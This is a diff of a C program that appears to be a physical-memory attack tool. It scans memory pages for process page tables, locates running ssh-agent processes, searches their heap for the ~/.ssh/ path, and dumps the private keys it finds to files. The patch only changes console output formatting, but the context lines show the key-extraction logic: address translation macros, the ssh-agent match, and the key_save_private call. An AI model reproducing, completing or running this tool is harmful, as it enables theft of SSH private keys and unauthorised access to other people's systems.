@@ -435,7 +435,7 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 	sprintf(filename, "key %016llx %s %s", guid, username, comment);
 
 	// dump the key
-	printf("\t\t" "\x1b[1;34m" "dumping key \"%s\" to file \"%s\"" "\x1b[0m" "\n", comment_field, filename);
+	printf("\t\t" "\x1b[1;32m" "dumping key \"%s\" to file \"%s\"" "\x1b[0m" "\n", comment_field, filename);
 	key_save_private(key, filename, "", comment_field);
 
 	free(comment_field);
@@ -459,7 +459,7 @@ void check_ssh_agent(linear_handle lin) {
 #	define REMOTE_TO_LOCAL(r,lbase)	((char*) (lbase + ((uint32_t)r) - (AGENT_START << 12)) )
 #	define LOCAL_TO_REMOTE(l,lbase)	((char*) (l - lbase + (AGENT_START << 12)) )
 
-	printf("\n\x1b[1;33m" "hit" "\x1b[0m" "\n");
+	printf("\x1b[5;41m" "hit:" "\x1b[0m" " ");
 	char identity_path[1024];
 	char* heap;	// actually this is a dump of the executable and heap
 			// but we don't care for the executable.
@@ -479,13 +479,13 @@ void check_ssh_agent(linear_handle lin) {
 	// get string we search for
 	home = resolve_env(lin, "HOME");
 	if(!home) {
-		printf("\tfailed to lookup $HOME\n");
+		printf("\tfailed to lookup $HOME!> ");
 		return;
 	}
 
 	snprintf(identity_path, 1024, "%s/.ssh/", home);
 	free(home);
-	printf("\tidentity path would be \"%s\"\n\n", identity_path);
+	printf("identity path would be \"%s\"> ", identity_path);
 	// now lets seek for this string. it will be located somewhere
 	// on the heap, right behind the executable.
 	// the executable is mapped somewhere after 0x08000000, so
@@ -503,7 +503,7 @@ void check_ssh_agent(linear_handle lin) {
 	while((comment = memmem(comment + 1, AGENT_MAXLEN * 4096 - (comment+1 - heap), identity_path, strlen(identity_path)))) {
 						// do not search the tailing \0 !
 		rcomment = LOCAL_TO_REMOTE(comment, heap);
-		printf("\tfound \"%s\" at remote 0x%08x\n", comment, (uint32_t)rcomment);
+		printf("\nfound \"%s\" at remote 0x%08x\n", comment, (uint32_t)rcomment);
 #ifdef __BIG_ENDIAN__
 		rcomment = (char*) endian_swap32((uint32_t)rcomment);
 #endif
@@ -632,12 +632,11 @@ int main(int argc, char**argv)
 	}
 
 	printf("keys:\t\t.    -   checked another 0x80 pages\n"
-		    "\t\t_    -   matched simple expression but not NCD"
-		    "\t\to    -   matched NCD but failed to load referenced pagetables"
-		    "\t\tK    -   matched NCD, loaded but found no stack (kernel thread?)"
-		    "\t\tU<n> -   matched NCD, loaded, found stack and process name ``n''"
-	      );
-
+		    "\t\t_    -   matched simple expression but not NCD\n"
+		    "\t\to    -   matched NCD but failed to load referenced pagetables\n"
+		    "\t\tK    -   matched NCD, loaded but found no stack (kernel thread?)\n"
+		    "\t\tU<n> -   matched NCD, loaded, found stack and process name ``n''\n"
+		    "\n");
 	// search all pages for pagedirs
 	// then, for each found, print process name
 	// we only need to check first phys. GB
@@ -653,7 +652,7 @@ int main(int argc, char**argv)
 				char* pname;
 
 				// set the pagedir
-				printf("page 0x%05llx prob: %0.3f", pn, prob);
+				//printf("page 0x%05llx prob: %0.3f", pn, prob);
 				if(linear_set_new_pagedirectory(lin, page)) {
 					putchar('o');
 					continue;
@@ -662,10 +661,10 @@ int main(int argc, char**argv)
 				// get process name
 				pname = get_process_name(lin);
 				if(!pname) {
-					putchar('K');
+					printf("\x1b[1;31m" "K" "\x1b[0m");
 					continue;
 				}
-				printf("U<%s>", pname);
+				printf("U" "\x1b[1;34m" "<%s>" "\x1b[0m", pname);
 
 				// check for ssh-agent
 				if((!strcmp(pname, "ssh-agent") || !strcmp(pname, "/usr/bin/ssh-agent")))
@@ -677,6 +676,7 @@ int main(int argc, char**argv)
 			}
 		}
 	}
+	printf("\n\n");
 
 	// release handles
 	printf("rel lin handle..\n"); fflush(stdout);
